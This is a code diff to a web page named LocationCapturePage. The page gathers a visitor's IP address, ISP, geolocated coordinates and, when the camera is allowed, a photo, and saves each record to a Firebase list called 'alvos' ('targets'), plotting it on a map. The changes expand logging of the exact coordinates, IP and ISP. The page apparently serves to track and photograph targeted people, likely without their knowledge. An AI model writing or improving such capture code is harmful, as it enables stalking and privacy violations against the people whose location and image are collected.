@@ -115,7 +115,7 @@ export default function LocationCapturePage() {
         ipHasCoordinates: !!(data.ipData?.latitude && data.ipData?.longitude),
         ipCoords:
           data.ipData?.latitude && data.ipData?.longitude
-            ? { lat: data.ipData.latitude, lng: data.ipData.longitude }
+            ? { lat: data.ipData.latitude, lng: data.ipData?.longitude }
             : null,
       })
 
@@ -153,13 +153,15 @@ export default function LocationCapturePage() {
           photoData && photoData !== "camera_denied" && photoData !== "camera_error" ? { photo: photoData } : undefined,
       }
 
-      console.log("[v0] 💾 Saving to Firebase:", {
-        hasIpData: !!capturePayload.ipData,
-        ipLat: capturePayload.ipData.latitude,
-        ipLng: capturePayload.ipData.longitude,
-        city: capturePayload.ipData.city,
-        country: capturePayload.ipData.country,
-        hasPhoto: !!capturePayload.formData?.photo,
+      console.log("[v0] 💾 Saving to Firebase with IP geolocation:", {
+        ip: capturePayload.ipData.ip,
+        coordinates: {
+          lat: capturePayload.ipData.latitude,
+          lng: capturePayload.ipData.longitude,
+        },
+        location: `${capturePayload.ipData.city}, ${capturePayload.ipData.country}`,
+        isp: capturePayload.ipData.isp,
+        message: "Marker will appear on the map at these exact coordinates based on IP geolocation",
       })
 
       await push(alvosRef, capturePayload)
